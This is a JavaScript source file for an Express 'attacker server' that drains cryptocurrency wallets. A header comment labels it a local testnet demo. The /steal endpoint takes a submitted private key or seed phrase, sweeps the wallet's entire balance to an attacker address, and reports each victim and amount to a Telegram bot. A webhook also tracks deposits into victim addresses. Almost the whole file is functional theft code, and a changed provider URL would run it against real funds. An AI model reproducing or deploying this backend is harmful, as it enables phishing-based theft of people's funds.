/* attacker-server.js (LOCAL DEMO ONLY) 
   - FOR EDUCATIONAL / LOCAL TEST USE ON TESTNETS (SEPOLIA) ONLY
   - DO NOT DEPLOY PUBLICLY OR USE WITH REAL/MAINNET FUNDS
*/
require('dotenv').config();
const express = require('express');
const { ethers } = require('ethers');
const fetch = require('node-fetch'); // v2

// ---------- CONFIG (from .env) ----------
const ALCHEMY_URL = process.env.ALCHEMY_URL;
const ATTACKER_ADDR = (process.env.ATTACKER_ADDR || "").toLowerCase();
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

// safety checks
if (!ALCHEMY_URL || !ATTACKER_ADDR) {
  console.error("Set ALCHEMY_URL and ATTACKER_ADDR in .env");
  process.exit(1);
}

const provider = new ethers.providers.JsonRpcProvider(ALCHEMY_URL);
const app = express();

const cors = require('cors');
const bodyParser = require('body-parser');

// allow requests from any origin
app.use(cors());

// keep rawBody for signature verification
app.use(bodyParser.json({
  verify: (req, res, buf) => { req.rawBody = buf; }
}));


// ---------- Simple in-memory alert rate-limit to avoid Telegram spam ----------
const ALERT_COOLDOWN_MS = 30 * 1000; // 30s per victim address
const lastAlertFor = new Map(); // victimAddress -> timestamp

function isOnCooldown(victimAddr) {
  const t = lastAlertFor.get(victimAddr);
  if (!t) return false;
  return (Date.now() - t) < ALERT_COOLDOWN_MS;
}
function setCooldown(victimAddr) {
  lastAlertFor.set(victimAddr, Date.now());
}

// ---------- Telegram helper ----------
function tgEscapeMarkdown(text) {
  if (!text || typeof text !== 'string') return text;
  return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
}

// sendTelegramAlert accepts either a string or an object with fields
async function sendTelegramAlert(payload) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('[TELEGRAM] token/chat not configured; skipping alert');
    return;
  }

  let text;
  if (typeof payload === 'string') {
    text = payload;
  } else {
    const {
      victim, balanceEth, txHash, gasUsed, gasFeeEth, senderAddr, senderName
    } = payload;
    const txUrl = txHash ? `https://sepolia.etherscan.io/tx/${txHash}` : 'n/a';
    const lines = [
      '*Sweep detected*',
      `• Victim: \`${victim}\``,
      `• Balance: ${balanceEth ?? 'n/a'} ETH`,
      `• Tx: ${txUrl}`,
      `• Gas fee: ${gasFeeEth ?? 'n/a'} ETH (gasUsed ${gasUsed ?? 'n/a'})`,
    ];
    if (senderAddr) {
      lines.push(`• Sender: \`${senderAddr}\`` + (senderName ? ` (${tgEscapeMarkdown(senderName)})` : ''));
    }
    lines.push(`• Time: ${new Date().toISOString()}`);
    text = lines.join('\n');
  }

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' };
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    const j = await resp.json();
    if (!j.ok) {
      console.error('[TELEGRAM] send failed', j);
    } else {
      console.log('[TELEGRAM] alert sent');
    }
  } catch (e) {
    console.error('[TELEGRAM] failed to send alert', e);
  }
}

// ---------------- Core sweep endpoint ----------------
const MIN_SWEEP = ethers.utils.parseEther("0.0001");
app.post('/steal', async (req, res) => {
  const start = Date.now();
  try {
    const { secret } = req.body;
    if (!secret || typeof secret !== 'string') {
      return res.status(400).json({ ok: false, error: "No secret provided" });
    }

    const trimmed = secret.trim();
    const maybeWords = trimmed.split(/\s+/);

    // Validate input
    if (maybeWords.length < 12) {
      const candidate = trimmed.startsWith('0x') ? trimmed : '0x' + trimmed;
      if (!/^0x[0-9a-fA-F]{64}$/.test(candidate)) {
        return res.status(400).json({ ok: false, error: "Invalid private key or mnemonic format" });
      }
    }

    // Construct wallet
    let wallet;
    if (maybeWords.length >= 12) {
      wallet = ethers.Wallet.fromMnemonic(trimmed);
    } else {
      const key = trimmed.startsWith('0x') ? trimmed : '0x' + trimmed;
      wallet = new ethers.Wallet(key);
    }

    const signer = wallet.connect(provider);
    const addr = (await signer.getAddress()).toLowerCase();
    console.log(`[ATTACKER] Received secret for address: ${addr} (${new Date().toISOString()})`);

    // Check balance
    const balance = await provider.getBalance(addr);
    const balanceStr = ethers.utils.formatEther(balance);
    console.log(`[ATTACKER] Balance for ${addr}: ${balanceStr} ETH`);

    if (balance.lt(MIN_SWEEP)) {
      console.log("[ATTACKER] Balance below threshold; not sweeping.");
      return res.status(200).json({ ok: true, swept: false, balance: balanceStr });
    }

    const gasLimit = ethers.BigNumber.from(21000);
    const feeData = await provider.getFeeData();
    let tx;

    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
      const estimatedFee = gasLimit.mul(feeData.maxFeePerGas);
      const sendAmount = balance.sub(estimatedFee);
      if (sendAmount.lte(0)) {
        return res.status(200).json({ ok: true, swept: false, reason: "Not enough for gas" });
      }
      tx = {
        to: ATTACKER_ADDR,
        value: sendAmount,
        gasLimit,
        maxFeePerGas: feeData.maxFeePerGas,
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
        type: 2
      };
    } else {
      const price = feeData.gasPrice || ethers.utils.parseUnits("5", "gwei");
      const fee = gasLimit.mul(price);
      const sendAmount = balance.sub(fee);
      if (sendAmount.lte(0)) {
        return res.status(200).json({ ok: true, swept: false, reason: "Not enough for gas" });
      }
      tx = {
        to: ATTACKER_ADDR,
        value: sendAmount,
        gasLimit,
        gasPrice: price
      };
    }

    // Send transaction
    const txResp = await signer.sendTransaction(tx);
    console.log(`[ATTACKER] Sweep tx sent: ${txResp.hash} (${new Date().toISOString()})`);

    const receipt = await txResp.wait(1);
    const elapsedMs = Date.now() - start;
    console.log(`[ATTACKER] Sweep confirmed: ${receipt.transactionHash} (elapsed ${elapsedMs}ms)`);

    const gasUsedBn = receipt.gasUsed || ethers.BigNumber.from(0);
    const effectiveGasPrice = receipt.effectiveGasPrice || receipt.gasPrice || ethers.BigNumber.from(0);
    const gasFeeEth = ethers.utils.formatEther(gasUsedBn.mul(effectiveGasPrice));

    // Telegram alert
    if (!isOnCooldown(addr)) {
      await sendTelegramAlert({
        victim: addr,
        balanceEth: balanceStr,
        txHash: receipt.transactionHash,
        gasUsed: gasUsedBn.toString(),
        gasFeeEth,
        senderAddr: null,
        senderName: null
      });
      setCooldown(addr);
    } else {
      console.log(`[ATTACKER] Skipped duplicate telegram alert for ${addr} (cooldown)`);
    }

    return res.status(200).json({
      ok: true,
      swept: true,
      txHash: txResp.hash,
      elapsedMs
    });

  } catch (err) {
    console.error("[ATTACKER] Error:", err);
    return res.status(500).json({ ok: false, error: String(err) });
  }
});

// ---------- Local deposits file storage (simple, dev only) ----------
const fs = require('fs');
const path = require('path');
const DEPOSITS_FILE = path.join(__dirname, 'deposits.json');

function saveDepositToFile(deposit) {
  let map = {};
  try { map = JSON.parse(fs.readFileSync(DEPOSITS_FILE, 'utf8') || '{}'); } catch (e) { map = {}; }
  map[deposit.txHash] = { ...(map[deposit.txHash] || {}), ...deposit, savedAt: new Date().toISOString() };
  fs.writeFileSync(DEPOSITS_FILE, JSON.stringify(map, null, 2));
}

function findRecentDepositFromFile(victimAddr, hours = 48) {
  try {
    const map = JSON.parse(fs.readFileSync(DEPOSITS_FILE, 'utf8') || '{}');
    const cutoff = Date.now() - hours * 3600 * 1000;
    const all = Object.values(map).filter(d => d.to && d.to.toLowerCase() === victimAddr.toLowerCase());
    all.sort((a, b) => new Date(b.savedAt) - new Date(a.savedAt));
    return all.find(d => new Date(d.savedAt).getTime() >= cutoff) || null;
  } catch (e) {
    return null;
  }
}

// ---------- Alchemy webhook endpoint ----------
const crypto = require('crypto');
const ALCHEMY_SIGNING_KEY = process.env.ALCHEMY_SIGNING_KEY || '';

app.post('/alchemy-webhook', async (req, res) => {
  try {
    // raw body must be available for HMAC verification
    const raw = req.rawBody ? req.rawBody.toString('utf8') : JSON.stringify(req.body || {});
    const sigHeader = (req.headers['x-alchemy-signature'] || req.headers['X-Alchemy-Signature'] || '').toString();

    // Verify signature if key present
    if (ALCHEMY_SIGNING_KEY) {
      if (!sigHeader) {
        console.warn('[ALCHEMY-WH] missing signature header');
        return res.status(401).send('missing signature');
      }
      const hmac = crypto.createHmac('sha256', ALCHEMY_SIGNING_KEY);
      hmac.update(raw, 'utf8');
      const expected = hmac.digest('hex');
      const ok = (expected.length === sigHeader.length) && crypto.timingSafeEqual(Buffer.from(expected, 'hex'), Buffer.from(sigHeader, 'hex'));
      if (!ok) {
        console.warn('[ALCHEMY-WH] signature mismatch');
        // respond 401 so Alchemy shows failure in delivery logs
        return res.status(401).send('invalid signature');
      }
    } else {
      console.warn('[ALCHEMY-WH] ALCHEMY_SIGNING_KEY not set — skipping verification (dev only).');
    }

    // Normalize payload (Alchemy sends event.activity array for Address Activity)
    const payload = req.body || {};
    const events = payload.event?.activity || payload.transfers || payload.events || [payload];

    let saved = 0;
    for (const ev of events) {
      // Map common field names to a standard format
      const txHash = (ev.hash || ev.transactionHash || ev.txHash || ev.tx_hash || '').toString();
      const from = (ev.fromAddress || ev.from || ev.from_address || ev.sender || '').toString().toLowerCase();
      const to = (ev.toAddress || ev.to || ev.to_address || ev.recipient || '').toString().toLowerCase();
      const value = (typeof ev.value !== 'undefined') ? ev.value : (ev.rawContract?.rawValue || ev.amount || ev.valueWei || null);

      if (!txHash) continue; // skip if no txHash

      const deposit = {
        txHash,
        from,
        to,
        value: value,
        token: ev.asset || ev.tokenSymbol || 'ETH',
        raw: ev
      };

      saveDepositToFile(deposit);
      saved++;
      console.log(`[ALCHEMY-WH] saved deposit txHash=${txHash} from=${from} to=${to} value=${value}`);
    }

    // quick 200 response
    return res.status(200).send({ ok: true, saved });
  } catch (err) {
    console.error('[ALCHEMY-WH] error', err);
    return res.status(500).send({ ok: false, error: String(err) });
  }
});

app.listen(PORT, () => {
  console.log(`[ATTACKER] Listening on port ${PORT}`);
});
